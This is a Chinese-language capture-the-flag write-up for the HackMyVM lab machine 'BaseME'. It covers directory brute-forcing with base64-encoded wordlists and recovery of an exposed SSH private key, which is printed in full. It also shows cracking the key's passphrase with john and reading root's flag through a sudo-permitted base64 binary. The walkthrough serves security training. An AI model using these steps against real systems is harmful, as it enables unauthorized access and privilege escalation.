# BaseME

2024-11-04 https://hackmyvm.eu/machines/machine.php?vm=BaseME

## IP

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 80 web 首页，出现以下内容：

```

QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK

<!--
iloveyou
youloveyou
shelovesyou
helovesyou
weloveyou
theyhatesme
-->
```

base64 解码后：

```
ALL, absolutely ALL that you need is in BASE64.
Including the password that you need :)
Remember, BASE64 has the answer to all your questions.
-lucas
```

发现一个用户名 lucas， 同时提示所有需要的信息都在 base64 ，对目录字典文件进行 base64 编码，然后 gobuster 进行探测：

```
for i in $(cat ~/tools/dict/fileName10000.txt); do echo $i|base64 >> base64.txt; done

gobuster dir -t 64 -k -w base64.txt -x php,txt,zip,rar -u http://192.168.5.40/
```

扫描出 2 个文件：

```
/aWRfcnNhCg==         (Status: 200) [Size: 2537]
/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]
```

访问 curl 'http://192.168.5.40/aWRfcnNhCg==' 得到 id_rsa 文件的 base64 值，进行解码，得到 id_rsa 原始值：

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL
BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1
cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG
07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh
7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv
f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4
vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X
YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK
xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs
+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi
NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ
zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0
IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI
pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ
MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp
+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV
tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh
i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+
tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw
N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM
Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ
O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2
TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl
3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL
ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ
LdmmRXUS/DtO+69/aidvxGAYob+1M=
-----END OPENSSH PRIVATE KEY-----
```

保存到 id_rsa 文件中 chmod 600 id_rsa，使用 ssh -i id_rsa lucas@192.168.5.40 发现密钥有密码，使用 ssh2john 进行转换，john 进行爆破，将 html 源码中的字符串也转换成 base64，然后使用此字典进行破解, 得到 id_rsa 的密码为 aWxvdmV5b3UK

得到 user flag:

```
lucas@baseme:~$ cat user.txt
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,

HMV8nnJAJAJA
```

sudo -l 发现 (ALL) NOPASSWD: /usr/bin/base64 使用此读取 root flag：

```
lucas@baseme:~$ sudo /usr/bin/base64 /root/root.txt|/usr/bin/base64 -d
                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,

HMVFKBS64
```
